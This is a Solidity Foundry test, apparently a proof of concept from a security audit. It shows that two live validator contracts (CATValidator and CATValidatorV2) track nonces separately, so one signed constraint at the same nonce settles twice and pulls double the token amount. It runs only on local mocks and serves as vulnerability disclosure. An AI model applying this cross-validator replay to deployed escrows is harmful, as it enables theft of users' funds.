// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity ^0.8.30;

import { Test } from "forge-std/src/Test.sol";

import { MockERC20 } from "solady/test/utils/mocks/MockERC20.sol";

import { CATValidator } from "../../src/CATValidator.sol";
import { CATValidatorV2 } from "../../src/CATValidatorV2.sol";
import { AllowanceSpend, Outcome } from "../../src/libs/LibExecutionConstraint.sol";
import { ExecutionBinding } from "../../src/libs/LibExecutionConstraintV2.sol";
import { VMCommand } from "../../src/libs/LibValidationVM.sol";

/// @dev Accepts every program.
contract AcceptVM {
    fallback() external { }
}

/**
 * PoC for finding: v1 CATValidator and CATValidatorV2 are simultaneously live
 * by design (script/deploy.s.sol `runValidatorV2`), but `spentNonces` is
 * per-contract storage. An escrow holding a live approved constraint on each
 * validator at the SAME nonce can be settled once per validator — the v1
 * settlement does not invalidate the V2 constraint and vice versa, although
 * the v1 NatSpec promises "invalidating other approvals by nonce" and the
 * refund design (E1) relies on same-nonce sibling-kill.
 */
contract CrossValidatorNonceShadowingPoC is Test {
    uint256 constant NONCE = 1;

    MockERC20 token;
    CATValidator v1;
    CATValidatorV2 v2;

    address signer;
    uint256 signerKey;
    address executor;
    address execTarget;

    function setUp() external {
        token = new MockERC20("Token", "TKN", 18);
        v1 = new CATValidator();
        v2 = new CATValidatorV2(address(new AcceptVM()));
        (signer, signerKey) = makeAddrAndKey("signer");
        executor = makeAddr("executor");
        execTarget = makeAddr("execTarget");

        token.mint(signer, 1000 ether);
        vm.startPrank(signer);
        token.approve(address(v1), type(uint256).max);
        token.approve(address(v2), type(uint256).max);
        vm.stopPrank();
    }

    function allowances() internal view returns (AllowanceSpend[] memory alls) {
        alls = new AllowanceSpend[](1);
        alls[0] = AllowanceSpend({ token: address(token), allocated: type(uint256).max, spend: 100 ether });
    }

    function allowanceHashWords(
        AllowanceSpend[] memory alls
    ) internal pure returns (bytes32) {
        bytes32[] memory hashes = new bytes32[](alls.length);
        for (uint256 i; i < alls.length; ++i) {
            hashes[i] = keccak256(
                abi.encode(
                    keccak256(bytes("Allowance(address token,uint256 amount)")), alls[i].token, alls[i].allocated
                )
            );
        }
        return keccak256(abi.encodePacked(hashes));
    }

    function signV1(
        AllowanceSpend[] memory alls
    ) internal returns (bytes memory) {
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256(
                    bytes(
                        "ExecutionConstraint(Allowance[] allowances,Outcome[] outcomes,address executor,uint256 nonce)Allowance(address token,uint256 amount)Outcome(address token,uint256 amount,address destination)"
                    )
                ),
                allowanceHashWords(alls),
                keccak256(abi.encodePacked(new bytes32[](0))),
                executor,
                NONCE
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", v1.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, digest);
        return abi.encodePacked(r, s, v);
    }

    function signV2(
        AllowanceSpend[] memory alls
    ) internal returns (bytes memory) {
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256(
                    bytes(
                        "ExecutionConstraint(Allowance[] allowances,Outcome[] outcomes,address executor,uint256 nonce,address executionTarget,bytes32 payloadHash,bytes32 validationProgramHash,bytes32 paramsHash)Allowance(address token,uint256 amount)Outcome(address token,uint256 amount,address destination)"
                    )
                ),
                allowanceHashWords(alls),
                keccak256(abi.encodePacked(new bytes32[](0))),
                executor,
                NONCE,
                address(0),
                bytes32(0),
                bytes32(0),
                bytes32(0)
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", v2.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, digest);
        return abi.encodePacked(r, s, v);
    }

    function test_sameAccountNonce_settlesOncePerValidator() external {
        AllowanceSpend[] memory alls = allowances();
        // Signatures are computed before the pranks: DOMAIN_SEPARATOR() is a
        // staticcall that would otherwise consume a one-shot vm.prank.
        bytes memory sigV2 = signV2(alls);
        bytes memory sigV1 = signV1(alls);

        // Settle the V2 constraint first at NONCE.
        vm.prank(executor);
        v2.entry(
            execTarget,
            hex"",
            signer,
            NONCE,
            alls,
            new Outcome[](0),
            ExecutionBinding({ executionTarget: address(0), payloadHash: bytes32(0) }),
            new VMCommand[](0),
            new bytes32[](0),
            sigV2
        );
        assertTrue(v2.spentNonces(signer, NONCE), "V2 nonce marked");
        assertEq(token.balanceOf(execTarget), 100 ether, "V2 pulled 100");

        // The sibling v1 constraint at the SAME account+nonce is still live.
        vm.prank(executor);
        v1.entry(execTarget, hex"", signer, NONCE, alls, new Outcome[](0), sigV1);
        assertTrue(v1.spentNonces(signer, NONCE), "v1 nonce marked independently");
        assertEq(token.balanceOf(execTarget), 200 ether, "same account+nonce settled twice across validators");

        // And neither can be replayed within its own contract.
        vm.prank(executor);
        vm.expectRevert(CATValidator.NonceAlreadySpent.selector);
        v2.entry(
            execTarget,
            hex"",
            signer,
            NONCE,
            alls,
            new Outcome[](0),
            ExecutionBinding({ executionTarget: address(0), payloadHash: bytes32(0) }),
            new VMCommand[](0),
            new bytes32[](0),
            sigV2
        );
        vm.prank(executor);
        vm.expectRevert(CATValidator.NonceAlreadySpent.selector);
        v1.entry(execTarget, hex"", signer, NONCE, alls, new Outcome[](0), sigV1);
    }
}
